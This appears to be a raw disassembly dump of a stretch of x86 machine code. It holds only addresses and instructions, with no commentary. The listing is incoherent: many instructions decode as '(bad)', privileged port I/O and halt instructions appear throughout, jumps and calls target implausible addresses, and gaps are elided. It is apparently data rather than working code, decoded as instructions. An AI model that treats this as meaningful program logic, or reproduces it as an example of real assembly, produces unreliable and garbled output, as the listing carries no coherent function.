  40be63:	add    BYTE PTR [esp+edx*8-0x239caace],dh
  40be6a:	idiv   DWORD PTR [edi+0x74ed1497]
  40be70:	or     edx,DWORD PTR [ebx]
  40be72:	add    ebp,DWORD PTR [eax-0x80]
  40be75:	mov    DWORD PTR [ecx+0x0],0x5536848c
  40be7c:	arpl   sp,bx
  40be7e:	jg     0x40be77
  40be80:	(bad)  
  40be81:	jmp    0x6c97bdbb
  40be86:	in     eax,dx
  40be87:	je     0x40be89
	...
  40be95:	add    BYTE PTR [eax],al
  40be97:	iret   
  40be98:	test   cl,ch
  40be9a:	test   esp,ecx
  40be9c:	push   edi
  40be9d:	push   esp
  40be9e:	mov    esi,DWORD PTR [ebx+0x797ffb53]
  40bea4:	div    DWORD PTR [esi+0x3]
  40bea7:	popf   
  40bea8:	fimul  DWORD PTR [esi+0x42]
  40beab:	pop    eax
  40beac:	sub    bh,BYTE PTR [eax+0x5]
  40beaf:	jecxz  0x40beb3
  40beb1:	add    al,0x75
  40beb3:	lea    esp,[edi]
  40beb5:	ja     0x40bec7
  40beb7:	xor    ebp,DWORD PTR [edi]
  40beb9:	ja     0x40bec3
  40bebb:	jnp    0x40bedc
  40bebd:	out    dx,al
  40bebe:	inc    BYTE PTR [ebp+eax*1-0x191fceef]
  40bec5:	sbb    eax,0x9be666d9
  40beca:	adc    ebp,DWORD PTR [eax+esi*2+0x19]
  40bece:	in     eax,dx
  40becf:	out    dx,eax
  40bed0:	cld    
  40bed1:	adc    BYTE PTR [edx-0x100219a2],dh
  40bed7:	xchg   ecx,eax
  40bed8:	lds    ebp,FWORD PTR [edi]
  40beda:	in     eax,dx
  40bedb:	dec    ebp
  40bedc:	out    0xed,al
  40bede:	icebp  
  40bedf:	imul   BYTE PTR [esi+ebp*8]
  40bee2:	cld    
  40bee3:	out    0x5c,eax
  40bee5:	fsubp  st(4),st
  40bee7:	xor    eax,0x44f85be6
  40beec:	cld    
  40beed:	imul   ebp,esp,0xf43be625
  40bef3:	add    al,0x4
  40bef5:	push   0xffffffec
  40bef7:	adc    eax,0xec3be6
	...
  40bf08:	add    BYTE PTR [eax],al
  40bf0a:	add    al,0xec
  40bf0c:	push   0xffffffec
  40bf0e:	add    eax,0x4f01be6
  40bf13:	hlt    
  40bf14:	push   0xffffffec
  40bf16:	cmc    
  40bf17:	in     eax,0x1b
  40bf19:	adc    al,0xec
  40bf1b:	outs   dx,DWORD PTR ds:[esi]
  40bf1c:	fucomp st(4)
  40bf1e:	outs   dx,DWORD PTR ds:[esi]
  40bf1f:	std    
  40bf20:	nop
  40bf21:	jno    0x40bf00
  40bf23:	in     eax,0x7d
  40bf25:	dec    esp
  40bf26:	stos   BYTE PTR es:[edi],al
  40bf27:	ret    0x3e4
  40bf2a:	ss jp  0x40bfa9
  40bf2d:	and    BYTE PTR [eax+0x577665dc],0xe6
  40bf34:	rcl    DWORD PTR [ebx],cl
  40bf36:	retf   
  40bf37:	pop    ebx
  40bf38:	mov    esp,0x28fa6303
  40bf3d:	ja     0x40bf4b
  40bf3f:	pop    ebx
  40bf40:	jmp    0xa866cfa0
  40bf45:	add    edx,DWORD PTR [edi+ebp*2+0x707fd900]
  40bf4c:	or     al,0x41
  40bf4e:	mov    DWORD PTR [eax-0x5a84d902],0x5510a873
  40bf58:	call   0xff27abf9
  40bf5d:	loop   0x40beff
  40bf5f:	jno    0x40bf92
  40bf61:	jo     0x40bf08
  40bf63:	in     eax,dx
  40bf64:	imul   esp,ebx,0xf685f238
  40bf6a:	cmp    BYTE PTR [eax],dl
  40bf6c:	shl    BYTE PTR [ebp+0x0],0x0
	...
  40bf7c:	add    BYTE PTR [ebx-0x1c],bl
  40bf7f:	je     0x40bf82
  40bf81:	xchg   edi,eax
  40bf82:	in     eax,dx
  40bf83:	and    DWORD PTR [edi+0x48],0xffffffe4
  40bf87:	dec    edi
  40bf88:	(bad)  
  40bf89:	mov    dl,0xed
  40bf8b:	dec    edi
  40bf8c:	into   
  40bf8d:	mov    dl,0xd
  40bf8f:	call   0xff24c8a6
  40bf94:	ror    DWORD PTR [eax-0x7490179],1
  40bf9a:	pop    ecx
  40bf9b:	call   0xfec85061
  40bfa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfa1:	pop    ds
  40bfa2:	push   edi
  40bfa3:	sbb    BYTE PTR [esi-0x1eff92f8],0x60
  40bfaa:	add    eax,0xe3dd0ee8
  40bfaf:	(bad)  
  40bfb0:	jo     0x40bfd4
  40bfb2:	fisttp QWORD PTR [esp-0x300ab35]
  40bfb9:	jo     0x40bf9f
  40bfbb:	je     0x40bf9a
  40bfbd:	test   al,0x9a
  40bfbf:	push   ebx
  40bfc0:	jmp    0xd500d025
  40bfc5:	xor    ah,cl
  40bfc7:	inc    esp
  40bfc8:	pop    ecx
  40bfc9:	addr16 add eax,0x49a1e900
  40bfcf:	hlt    
  40bfd0:	add    BYTE PTR ds:0xb0000008,ah
  40bfd6:	or     BYTE PTR [edx+0x0],ch
  40bfd9:	mov    al,ds:0x27006a08
  40bfde:	inc    esi
  40bfdf:	hlt    
  40bfe0:	push   eax
	...
  40bfed:	add    BYTE PTR [eax],al
  40bfef:	add    BYTE PTR [ebp+0x56],al
  40bff2:	clc    
  40bff3:	dec    edi
  40bff5:	fdivr  st,st(5)
  40bff7:	jne    0x40c04f
  40bff9:	ror    DWORD PTR [esi+0xb087a54],0xc0
  40c000:	fimul  WORD PTR [edx]
  40c002:	jmp    0x40c03e
  40c004:	repnz lds esp,FWORD PTR [esi]
  40c007:	inc    ecx
  40c008:	cmp    ch,bh
  40c00a:	jae    0x40c01c
  40c00c:	bound  edx,QWORD PTR [edi-0x10ba007d]
  40c012:	jae    0x40c00c
  40c014:	jp     0x40bfd7
  40c016:	inc    DWORD PTR [ebp+0x4587ef15]
  40c01c:	out    0xee,al
  40c01e:	jae    0x40c038
  40c020:	and    eax,0x4fff1455
  40c025:	mov    ebp,0xef0675fd
  40c02a:	jae    0x40c034
  40c02c:	and    dl,BYTE PTR [ecx]
  40c02e:	(bad)  
  40c02f:	inc    ebp
  40c031:	out    dx,al
  40c032:	jae    0x40c020
  40c034:	sar    BYTE PTR [esi-0x112a0081],cl
  40c03a:	inc    ebx
  40c03b:	lock loope 0x40bfcc
  40c03e:	std    
  40c03f:	jne    0x40c027
  40c041:	mov    edi,0x7ca543a
  40c046:	push   DWORD PTR [ebp+0x52]
  40c049:	rcr    al,0x81
  40c04c:	xor    eax,0xbec2c7ef
  40c051:	pop    es
  40c052:	push   ebp
  40c053:	mov    eax,DWORD PTR [eax]
	...
  40c061:	add    BYTE PTR [eax],al
  40c063:	es mov edx,eax
  40c066:	hlt    
  40c067:	arpl   WORD PTR [edx+ebp*8],di
  40c06a:	(bad)  
  40c06b:	cmp    esi,ebp
  40c06d:	pop    esp
  40c06e:	and    al,0x9c
  40c070:	mov    al,ds:0xa39ae7fa
  40c075:	jmp    0xe6f19b78
  40c07a:	(bad)  
  40c07b:	pop    esi
  40c07c:	lods   al,BYTE PTR ds:[esi]
  40c07d:	sub    DWORD PTR [ecx+0x63],eax
  40c080:	out    dx,al
  40c081:	add    al,BYTE PTR [eax]
  40c083:	arpl   WORD PTR [ecx-0x80],si
  40c086:	imul   BYTE PTR [ebp-0x6]
  40c089:	jmp    0x42abbdd
  40c08e:	add    BYTE PTR [ebx-0xc],ah
  40c091:	jne    0x40c0e6
  40c093:	arpl   sp,bp
  40c095:	pop    edx
  40c096:	or     al,0xa3
  40c098:	lods   eax,DWORD PTR ds:[esi]
  40c099:	add    ch,BYTE PTR [eax+0x5f]
  40c09c:	lods   al,BYTE PTR ds:[esi]
  40c09d:	inc    ebx
  40c09e:	add    bl,cl
  40c0a0:	or     al,BYTE PTR [ecx+eax*2+0x63]
  40c0a4:	ret    
  40c0a5:	cs push ebp
  40c0a7:	jp     0x40c0d6
  40c0a9:	add    al,0xff
  40c0ab:	scas   al,BYTE PTR es:[edi]
  40c0ac:	in     al,0xda
  40c0ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0af:	sbb    eax,0x6767e8cc
  40c0b4:	sub    al,0x43
  40c0b6:	add    BYTE PTR [ebx-0x10],bh
  40c0b9:	inc    edx
  40c0ba:	inc    ecx
  40c0bb:	arpl   WORD PTR [edx+ecx*1+0x40],ax
  40c0bf:	mov    ds:0x63025aec,al
  40c0c4:	in     al,dx
  40c0c5:	cmp    dh,0x0
	...
  40c0d4:	add    BYTE PTR [eax],al
  40c0d6:	jbe    0x40c0bc
  40c0d8:	fimul  DWORD PTR [ebx-0x73176c1b]
  40c0de:	out    0x63,al
  40c0e0:	jmp    0x3015:0xdbfcd4fe
  40c0e7:	in     al,dx
  40c0e8:	add    bh,bh
  40c0ea:	dec    esi
  40c0eb:	jo     0x40c0d6
  40c0ed:	je     0x40c15a
  40c0ef:	add    eax,0xe236d351
  40c0f4:	pop    ebp
  40c0f5:	mov    ebx,0x4ee909a2
  40c0fa:	fdiv   st,st(1)
  40c0fc:	rcl    BYTE PTR [bx+si+0x45e3],0xe9
  40c102:	or     al,BYTE PTR ds:0x588c1ed3
  40c108:	loope  0x40c0e5
  40c10a:	adc    ah,BYTE PTR [ebx+0x2e]
  40c10d:	jmp    0x5e6609fd
  40c112:	pop    ecx
  40c113:	in     eax,dx
  40c114:	popf   
  40c115:	jle    0x40c184
  40c117:	loop   0x40c0fa
  40c119:	ret    
  40c11a:	lock sub BYTE PTR [ecx-0x16bb6309],al
  40c121:	push   ebx
  40c122:	dec    ebx
  40c123:	stc    
  40c124:	arpl   cx,bp
  40c126:	dec    ebp
  40c127:	xor    eax,0xf2730381
  40c12c:	cs pop esp
  40c12e:	xchg   ebx,eax
  40c12f:	inc    ebp
  40c130:	sub    BYTE PTR [ebx+edx*4],al
  40c133:	loop   0x40c188
  40c135:	cld    
  40c136:	inc    esp
  40c137:	ror    DWORD PTR [ebx+0xe8],0x0
	...
  40c146:	add    BYTE PTR [eax],al
  40c148:	add    BYTE PTR ds:0x1d82e0ed,ah
  40c14e:	loop   0x40c0fd
  40c150:	(bad)  
  40c151:	sahf   
  40c152:	and    ch,BYTE PTR [eax]
  40c154:	add    al,0x62
  40c156:	add    eax,0x87d603e9
  40c15b:	mov    ch,0xe9
  40c15d:	std    
  40c15e:	loope  0x40c198
  40c160:	pop    esp
  40c161:	pop    edi
  40c162:	add    al,0xe9
  40c164:	add    edi,ebx
  40c166:	lahf   
  40c167:	cmp    al,BYTE PTR [ebx+eiz*2]
  40c16a:	ins    DWORD PTR es:[edi],dx
  40c16b:	fld    QWORD PTR [ebx+0x22]
  40c16e:	add    eax,0x44230011
  40c173:	jmp    0x862ed3
  40c178:	sub    BYTE PTR [edi-0x1e],bl
  40c17b:	xor    al,0x14
  40c17d:	pop    eax
  40c17e:	inc    esp
  40c17f:	add    BYTE PTR [esi+0x45],ah
  40c182:	or     eax,0xe2c55be8
  40c187:	inc    cl
  40c189:	lods   al,BYTE PTR ds:[esi]
  40c18a:	and    DWORD PTR [ecx-0x17],eax
  40c18d:	cmp    BYTE PTR [ecx],cl
  40c18f:	inc    eax
  40c190:	test   al,0x60
  40c192:	ins    DWORD PTR es:[edi],dx
  40c193:	push   ds
  40c194:	test   eax,0xeb680521
  40c199:	pusha  
  40c19a:	add    eax,0xd0d2e80
  40c19f:	call   0xff233ee3
  40c1a4:	ins    BYTE PTR es:[edi],dx
  40c1a5:	in     eax,dx
  40c1a6:	(bad)  
  40c1a8:	push   ss
  40c1a9:	jnp    0x40c1fc
  40c1ab:	call   0x40c239
	...
  40c1bc:	mov    dh,0x5
  40c1be:	add    BYTE PTR [esi],al
  40c1c0:	vpaddd xmm6,xmm3,XMMWORD PTR [eax+ecx*2-0x17]
  40c1c6:	sbb    dh,BYTE PTR [edi+0x3b]
  40c1c9:	loopne 0x40c193
  40c1cb:	sub    edi,DWORD PTR [ecx+eiz*8]
  40c1ce:	push   ebx
  40c1cf:	jb     0x40c1ec
  40c1d1:	xchg   bl,al
  40c1d3:	aad    0x45
  40c1d5:	loopne 0x40c1d5
  40c1d7:	inc    ebx
  40c1d8:	pop    edi
  40c1d9:	imul   esp,DWORD PTR [esi],0xffffffce
  40c1dc:	xchg   edx,eax
  40c1dd:	or     eax,0xe08a85e8
  40c1e2:	(bad)  
  40c1e3:	jo     0x40c187
  40c1e5:	loope  0x40c1ad
  40c1e7:	in     al,dx
  40c1e8:	inc    esi
  40c1e9:	and    BYTE PTR [ecx-0x17],al
  40c1ec:	pusha  
  40c1ed:	add    eax,0x897be900
  40c1f2:	neg    BYTE PTR [edi+0x14fe004]
  40c1f8:	arpl   WORD PTR [esi],ax
  40c1fa:	add    cl,ch
  40c1fc:	mov    eax,0xca00521a
  40c201:	add    al,0x68
  40c203:	imul   edi,DWORD PTR [edx+0x4a],0x0
  40c207:	push   0x41495b
  40c20c:	bound  eax,QWORD PTR [edi]
  40c20e:	inc    eax
  40c20f:	inc    ecx
  40c210:	retf   0x33e7
  40c213:	push   ebp
  40c214:	push   ebx
  40c215:	dec    edx
  40c216:	add    bh,bh
  40c218:	xchg   esp,ebx
  40c21a:	out    0x6b,al
  40c21c:	das    
  40c21d:	call   0x412b1f
	...
  40c22e:	add    BYTE PTR [ecx-0x4dffbebc],dh
  40c234:	imul   eax,DWORD PTR [eax+0x41],0x401e3c7a
  40c23b:	retf   
  40c23c:	add    al,0x68
  40c23e:	add    cl,BYTE PTR [edx-0x28007ffc]
  40c244:	fsubr  st(6),st
  40c246:	dec    edi
  40c247:	dec    edi
  40c248:	call   0xf108504a
  40c24d:	cld    
  40c24e:	call   FWORD PTR [ebp+0x39]
  40c251:	call   0x44ae2f
  40c256:	inc    edi
  40c258:	call   0xbc83385a
  40c25d:	xchg   edx,eax
  40c25e:	jge    0x40c29d
  40c260:	out    0xc7,eax
  40c262:	ret    0x446
  40c265:	push   ebp
  40c266:	mov    ebx,DWORD PTR [esi]
  40c268:	mov    edx,eax
  40c26a:	hlt    
  40c26b:	sub    al,0xe7
  40c26d:	std    
  40c26e:	push   0xa
  40c270:	ds daa 
  40c272:	call   DWORD PTR [edi-0x1f]
  40c275:	out    0x35,al
  40c277:	dec    edi
  40c278:	call   0xed884c7a
  40c27d:	lds    eax,FWORD PTR ds:0x412844
  40c283:	cli    
  40c284:	add    eax,DWORD PTR [eax]
  40c286:	add    BYTE PTR [ebx+0x69],ah
  40c289:	xor    dh,0xdd
  40c28c:	mov    fs,ebp
  40c28e:	dec    edi
  40c28f:	dec    ebx
  40c290:	repnz add eax,DWORD PTR [eax]
	...
  40c29f:	add    BYTE PTR [eax],al
  40c2a1:	add    BYTE PTR [ebx+0x76],ah
  40c2a4:	xchg   ebp,eax
  40c2a5:	push   eax
  40c2a6:	arpl   si,bp
  40c2a8:	pop    edx
  40c2a9:	test   DWORD PTR [ebx],esp
  40c2ab:	sub    eax,0xae346804
  40c2b0:	inc    ebx
  40c2b1:	add    BYTE PTR [ebx],bh
  40c2b3:	loopne 0x40c2f7
  40c2b5:	inc    ecx
  40c2b6:	arpl   WORD PTR [edi],si
  40c2b8:	xor    BYTE PTR [ebp+0x4a],dl
  40c2bb:	lods   eax,DWORD PTR ds:[esi]
  40c2bc:	add    bh,bh
  40c2be:	push   cs
  40c2bf:	(bad)  
  40c2c0:	(bad)  
  40c2c2:	(bad)  
  40c2c3:	push   ds
  40c2c4:	out    0x67,al
  40c2c6:	fisubr WORD PTR [ebp-0x50f4ffbd]
  40c2cc:	inc    edx
  40c2cd:	inc    ecx
  40c2ce:	arpl   WORD PTR [esi+0x4],si
  40c2d1:	inc    eax
  40c2d2:	and    ch,dh
  40c2d4:	pop    edx
  40c2d5:	add    ah,BYTE PTR [ebx-0x12]
  40c2d8:	cmp    dh,0xd6
  40c2db:	in     al,0xda
  40c2dd:	(bad)  
  40c2de:	push   edi
  40c2df:	or     dh,ah
  40c2e1:	mov    esi,fs
  40c2e3:	xlat   BYTE PTR ds:[ebx]
  40c2e4:	jecxz  0x40c2e4
  40c2e6:	inc    esp
  40c2e7:	jge    0x40c2c3
  40c2e9:	push   ecx
  40c2ea:	xchg   edx,eax
  40c2eb:	in     al,dx
  40c2ec:	add    bh,bh
  40c2ee:	scas   al,BYTE PTR es:[edi]
  40c2ef:	call   0xb49c37d8
  40c2f4:	idiv   BYTE PTR [esp-0x48]
  40c2f8:	mov    edx,0x4dec67c1
  40c2fd:	mov    eax,DWORD PTR [edi]
  40c2ff:	outs   dx,BYTE PTR ds:[esi]
  40c300:	shl    bl,0xd
  40c303:	mov    al,ds:0x69e4
	...
  40c314:	add    BYTE PTR [ebx+0x42],ah
  40c317:	sbb    al,0xff
  40c319:	jbe    0x40c2ff
  40c31b:	fisubr DWORD PTR [ebp-0x1a59fa89]
  40c321:	fisttp DWORD PTR [eax-0x63]
  40c324:	mov    ebp,0x42d6475f
  40c329:	arpl   WORD PTR ds:0x906303e9,ax
  40c32f:	imul   ebp,ebp,0xffffffce
  40c332:	fidivr WORD PTR [ebp+0x54]
  40c335:	cmp    ecx,DWORD PTR [ecx]
  40c337:	call   0xc12e263f
  40c33c:	push   edx
  40c33d:	arpl   WORD PTR ds:0x446c86d1,ax
  40c343:	jmp    0xa88691a3
  40c348:	add    ecx,DWORD PTR [ebx]
  40c34a:	jmp    FWORD PTR [eax-0x4219cbe]
  40c350:	dec    esi
  40c351:	cmp    al,BYTE PTR [ecx+ebp*8-0x1c]
  40c355:	prefetch BYTE PTR [ecx+0x47]
  40c359:	jg     0x40c339
  40c35b:	sub    eax,0xa845d65c
  40c360:	add    edi,ebx
  40c362:	ja     0x40c30c
  40c364:	inc    edx
  40c365:	arpl   WORD PTR [ebp-0x9],bp
  40c368:	inc    ebx
  40c369:	mov    ds:0x63018105,al
  40c36e:	add    eax,0xdd7e569
  40c373:	adc    DWORD PTR [ebx+0x47],eax
  40c376:	fdivrp st(5),st
  40c378:	jbe    0x40c37a
	...
  40c386:	add    BYTE PTR [eax],al
  40c388:	out    0xd5,eax
  40c38a:	out    dx,al
  40c38b:	in     al,0x35
  40c38d:	xor    eax,0x59cb8d1
  40c392:	jmp    0xd622737b
  40c397:	outs   dx,BYTE PTR ds:[esi]
  40c398:	imul   ebp,ebp,0x66
  40c39b:	addr16 adc al,0xde
  40c39e:	scas   eax,DWORD PTR es:[edi]
  40c39f:	shl    DWORD PTR [eax+0x5],0x14
  40c3a3:	jns    0x40c39d
  40c3a5:	cmp    edi,0x6c04ac
  40c3ab:	inc    ebx
  40c3ac:	pop    eax
  40c3ad:	fidiv  WORD PTR [ecx+esi*8+0x8]
  40c3b1:	sub    al,0x7c
  40c3b3:	sahf   
  40c3b4:	dec    DWORD PTR [esp+eax*2+0x68053a95]
  40c3bb:	stos   DWORD PTR es:[edi],eax
  40c3bc:	and    BYTE PTR [eax+eax*1+0x11],al
  40c3c0:	pop    ss
  40c3c1:	push   ds
  40c3c2:	inc    ecx
  40c3c3:	jmp    0xc095dc87
  40c3c8:	and    DWORD PTR ds:0xdee179e8,eax
  40c3ce:	(bad)  
  40c3cf:	repnz mov al,ds:0x8b91951
  40c3d5:	add    eax,0x65c64600
  40c3da:	shr    BYTE PTR [ecx+0x46500521],cl
  40c3e0:	std    
  40c3e1:	or     al,0xe8
  40c3e3:	outs   dx,BYTE PTR ds:[esi]
  40c3e4:	ret    
  40c3e5:	fdivp  st(6),st
  40c3e7:	inc    ecx
  40c3e8:	retf   
  40c3e9:	pop    edi
  40c3ea:	jmp    FWORD PTR [esi]
	...
  40c3f8:	add    BYTE PTR [eax],al
  40c3fa:	add    BYTE PTR [edx],bl
  40c3fc:	add    eax,0x44203068
  40c401:	add    BYTE PTR [ecx-0x16bee250],dl
  40c407:	inc    edi
  40c408:	adc    dl,BYTE PTR [ebp-0x40]
  40c40b:	mov    eax,ds:0xe145e805
  40c410:	(bad)  
  40c412:	repnz and BYTE PTR [ecx+0x19],bl
  40c416:	cdq    
  40c417:	cwde   
  40c418:	add    eax,0x64fffe00
  40c41d:	shr    BYTE PTR [ecx],cl
  40c41f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c420:	add    eax,0xd8ade50
  40c425:	call   0xff1c885c
  40c42a:	shr    eax,0x5a
  40c42d:	inc    DWORD PTR [eax]
  40c42f:	and    eax,0xc5fc73e9
  40c434:	ds or  al,ch
  40c437:	mov    al,0x3c
  40c439:	(bad)  
  40c43a:	inc    ebx
  40c43c:	ret    
  40c43d:	add    al,BYTE PTR [eax]
  40c43f:	das    
  40c440:	mov    edx,gs
  40c442:	cmp    DWORD PTR [esi+0x605754e5],0x1
  40c449:	push   0x2a
  40c44b:	in     eax,0x3e
  40c44d:	or     al,ch
  40c44f:	inc    esi
  40c450:	cmp    al,0xff
  40c452:	call   DWORD PTR [ebx+0x4e]
  40c455:	cld    
  40c456:	push   0xffffffca
  40c458:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c45a:	add    BYTE PTR [ebp-0x18],0x9
  40c45e:	rol    BYTE PTR [eax],0x0
	...
  40c46d:	add    BYTE PTR [esi-0x4597b127],cl
  40c473:	or     bh,ch
  40c475:	mov    esi,0x413ec7a2
  40c47a:	mov    bl,BYTE PTR [eax]
  40c47c:	push   DWORD PTR [ebp-0x6e]
  40c47f:	lock bt DWORD PTR [ebp-0x18],eax
  40c484:	out    0x3d,al
  40c486:	mov    ah,0xe7
  40c488:	std    
  40c489:	mov    ebp,DWORD PTR [edi+0x56]
  40c48c:	sub    BYTE PTR [ecx+0x7a],al
  40c48f:	mov    edi,DWORD PTR [ebx]
  40c491:	jb     0x40c425
  40c493:	inc    ecx
  40c494:	add    BYTE PTR [eax+0x45740835],al
  40c49a:	loop   0x40c487
  40c49c:	ds inc ecx
  40c49e:	cmp    bl,BYTE PTR [edi]
  40c4a0:	call   0x48af62
  40c4a5:	or     ecx,DWORD PTR [edx+0x62561f3d]
  40c4ab:	loope  0x40c432
  40c4ad:	inc    DWORD PTR [ebp+0x18]
  40c4b0:	push   0xbcd73a00
  40c4b5:	push   0x41429363
  40c4ba:	arpl   WORD PTR [esi],bx
  40c4bc:	jecxz  0x40c532
  40c4be:	pop    ebx
  40c4bf:	mov    dh,0xb4
  40c4c1:	mov    eax,ds:0xfdea9b04
  40c4c6:	jle    0x40c45b
  40c4c8:	loope  0x40c4b4
  40c4ca:	bound  esp,QWORD PTR [esp+eax*4]
  40c4cd:	cmp    eax,0x45ddf963
	...
  40c4de:	add    BYTE PTR [eax],al
  40c4e0:	add    bh,ah
  40c4e2:	mov    esi,0x72dcb8c2
  40c4e7:	loope  0x40c4e7
  40c4e9:	rcr    DWORD PTR [ebx],1
  40c4eb:	sbb    eax,DWORD PTR [edi]
  40c4ed:	push   esi
  40c4ee:	inc    edi
  40c4ef:	loop   0x40c565
  40c4f1:	(bad)  
  40c4f2:	pop    edx
  40c4f3:	pop    eax
  40c4f4:	or     bl,cl
  40c4f6:	neg    DWORD PTR [esi-0x1]
  40c4f9:	mov    ah,0xa
  40c4fb:	inc    edx
  40c4fc:	leave  
  40c4fd:	mov    eax,ds:0xd85502e9
  40c502:	dec    ecx
  40c503:	xchg   bl,al
  40c505:	lahf   
  40c506:	fwait
  40c507:	cmp    DWORD PTR [edx+0x63],ebp
  40c50a:	enter  0xff2d,0x16
  40c50e:	(bad)  
  40c50f:	jmp    0x2688:0xe21b09f9
  40c516:	adc    cl,BYTE PTR [esi+0x45060534]
  40c51c:	add    al,bl
  40c51e:	loopne 0x40c574
  40c520:	sub    BYTE PTR [edx],ah
  40c522:	out    dx,al
  40c523:	cmp    BYTE PTR [esi],0x63
  40c526:	js     0x40c56f
  40c528:	push   0x43ad54
  40c52d:	mov    ah,0xf4
  40c52f:	and    DWORD PTR [eax+0x63],edx
  40c532:	in     al,dx
  40c533:	or     eax,0x38b3b7c0
  40c538:	call   0xff2328fe
  40c53d:	xchg   ebx,eax
  40c53e:	add    eax,0xea630451
  40c543:	sahf   
  40c544:	ins    BYTE PTR es:[edi],dx
	...
  40c551:	add    BYTE PTR [eax],al
  40c553:	add    BYTE PTR [edx],dl
  40c555:	inc    esi
  40c556:	sub    BYTE PTR [ebx+esi*4],al
  40c559:	ficom  DWORD PTR [ebx+0xc]
  40c55c:	sti    
  40c55d:	xor    DWORD PTR [ebx+0x68ee05e1],ecx
  40c563:	pop    edi
  40c564:	cld    
  40c565:	fcmovb st,st(1)
  40c567:	add    ebx,DWORD PTR [ebp+0x7603ee85]
  40c56d:	fild   QWORD PTR [esi]
  40c56f:	loopne 0x40c5a2
  40c571:	lds    ebx,FWORD PTR [edi-0x1f]
  40c574:	fstp   st(2)
  40c576:	xchg   ebp,eax
  40c577:	(bad)  
  40c578:	push   es
  40c579:	push   ds
  40c57a:	out    0x56,al
  40c57c:	or     bl,bl
  40c57e:	sti    
  40c57f:	ffreep st(5)
  40c581:	push   eax
  40c582:	icebp  
  40c583:	jmp    0x40c51d
  40c585:	pop    edi
  40c586:	jbe    0x40c569
  40c588:	adc    eax,0x60c6a03b
  40c58d:	add    eax,0x86b88cbc
  40c592:	and    al,0xe0
  40c594:	or     al,BYTE PTR ds:0x50942fc3
  40c59a:	loope  0x40c587
  40c59c:	push   cs
  40c59d:	pop    edi
  40c59e:	inc    esi
  40c59f:	loope  0x40c57c
  40c5a1:	inc    eax
  40c5a2:	cmp    eax,0xe96f636e
  40c5a7:	imul   esp,DWORD PTR [esp+eax*2-0x58],0x3
  40c5ac:	sti    
  40c5ad:	add    al,0xe9
  40c5af:	add    esp,ebx
  40c5b1:	in     eax,dx
  40c5b2:	mov    al,0x83
  40c5b4:	pop    ebp
  40c5b5:	(bad)  
  40c5b7:	ret    
	...
  40c5c4:	add    BYTE PTR [eax],al
  40c5c6:	add    al,dl
  40c5c8:	cli    
  40c5c9:	mov    eax,0x5833deb
  40c5ce:	loope  0x40c564
  40c5d0:	ins    DWORD PTR es:[edi],dx
  40c5d1:	jmp    0xffdc11d9
  40c5d6:	sub    BYTE PTR [edx+0x44],0x41
  40c5da:	jmp    0xf1b5a04f
  40c5df:	cmp    ch,ah
  40c5e1:	mov    al,ds:0xce203de
  40c5e6:	push   esp
  40c5e7:	add    bl,bl
  40c5e9:	(bad)  
  40c5ea:	push   esp
  40c5eb:	add    ebx,ebx
  40c5ed:	je     0x40c5e0
  40c5ef:	clc    
  40c5f0:	pop    ecx
  40c5f1:	jp     0x40c5b1
  40c5f3:	add    ecx,ebp
  40c5f5:	shr    ebp,0x60
  40c5f8:	xor    BYTE PTR [ebx-0x43a1843],cl
  40c5fe:	adc    ebx,DWORD PTR [edi+0x6f]
  40c601:	sub    eax,0xe80d359e
  40c606:	int    0x36
  40c608:	(bad)  
  40c60a:	pusha  
  40c60b:	and    eax,0x60e967d9
  40c610:	jmp    0xe941:0x442e11bd
  40c617:	dec    eax
  40c618:	xor    al,BYTE PTR [ecx+0x28]
  40c61b:	fidiv  DWORD PTR [si-0xf]
  40c61f:	mov    eax,0x835ea0ed
  40c624:	fidiv  DWORD PTR [ebp+edx*2-0x7d]
  40c628:	push   eax
  40c629:	or     BYTE PTR [ecx+0x0],al
	...
  40c638:	add    BYTE PTR [eax],al
  40c63a:	and    eax,0x9946ff5f
  40c63f:	ret    
  40c640:	add    ebp,ecx
  40c642:	xor    eax,0x9c6aeb8e
  40c647:	(bad)  [ecx-0x17]
  40c64a:	(bad)  
  40c64b:	sub    bh,bh
  40c64d:	pushf  
  40c64e:	pop    eax
  40c64f:	in     eax,dx
  40c650:	call   0x891909f5
  40c655:	lods   al,BYTE PTR ds:[esi]
  40c656:	xor    al,0x61
  40c658:	add    cl,ch
  40c65a:	push   ebx
  40c65b:	fwait
  40c65c:	addr16 add al,bl
  40c65f:	inc    ebx
  40c660:	inc    ecx
  40c661:	add    dl,dl
  40c663:	cmp    eax,0xe64a4141
  40c668:	jae    0x40c672
  40c66a:	bound  esi,QWORD PTR [ebx-0x61]
  40c66d:	(bad)  
  40c66e:	cmp    eax,0x2d00006a
  40c673:	js     0x40c6db
  40c675:	ins    DWORD PTR es:[edi],dx
  40c676:	dec    ebx
  40c677:	inc    edx
  40c678:	add    BYTE PTR [eax-0x4b],ch
  40c67b:	inc    edx
  40c67c:	inc    ecx
  40c67d:	add    BYTE PTR ds:0x80e8083f,bl
  40c683:	mov    ds:0x3eadfffd,al
  40c688:	cld    
  40c689:	push   DWORD PTR [edi]
  40c68b:	or     eax,ebp
  40c68d:	repz inc ebx
  40c68f:	mov    eax,0xe08c9fd
  40c694:	add    BYTE PTR [ebp+0x41],dl
  40c697:	aad    0x81
  40c699:	(bad)  
  40c69a:	fimul  WORD PTR [ebx+edx*2+0x10]
	...
  40c6ad:	push   ecx
  40c6ae:	shr    DWORD PTR [eax+0x0],cl
  40c6b1:	dec    edi
  40c6b2:	dec    esi
  40c6b3:	cld    
  40c6b4:	push   eax
  40c6b5:	sub    eax,0xba6a083e
  40c6ba:	mov    bh,0x73
  40c6bc:	adc    BYTE PTR ds:0x4a851c13,bh
  40c6c2:	ds daa 
  40c6c4:	mov    edx,edi
  40c6c6:	mov    eax,0x6e7a6a8e
  40c6cb:	add    BYTE PTR [eax+0x1d],ch
  40c6ce:	add    al,0x0
  40c6d0:	add    BYTE PTR ds:0x2d6a0c3e,bh
  40c6d6:	mov    eax,0x4a00470
  40c6db:	push   0x0
  40c6dd:	push   edx
  40c6de:	stos   BYTE PTR es:[edi],al
  40c6df:	dec    ebx
  40c6e0:	add    BYTE PTR [edx+0x54],cl
  40c6e3:	(bad)  
  40c6e4:	jne    0x40c749
  40c6e6:	bnd jmp 0x40c748
  40c6e9:	popf   
  40c6ea:	out    dx,al
  40c6eb:	add    cl,cl
  40c6ed:	and    edx,edx
